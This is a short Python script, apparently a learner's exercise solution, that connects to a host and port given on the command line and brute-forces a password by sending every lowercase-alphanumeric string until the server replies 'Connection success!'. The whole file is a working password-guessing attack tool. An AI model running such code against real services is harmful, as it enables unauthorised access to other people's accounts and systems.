# write your code here
import sys
import socket
import itertools
import string


def establish_connection(ip_address: str, port: int):
    sock = socket.socket()
    address = (ip_address, port)
    sock.connect(address)
    return sock


def generate_password():
    alphabet = list(string.ascii_lowercase) + list(string.digits)
    for i in range(1, 256):
        for password in itertools.product(alphabet, repeat=i):
            yield password


def hack_password(socket_):
    generator = generate_password()
    for item in generator:
        password = ''.join(item)
        socket_.send(password.encode(encoding='utf-8'))
        response = socket_.recv(256).decode()
        if response == "Connection success!":
            return password


if __name__ == '__main__':
    args = sys.argv
    opened_socket = establish_connection(args[1], int(args[2]))
    print(hack_password(opened_socket))
    opened_socket.close()
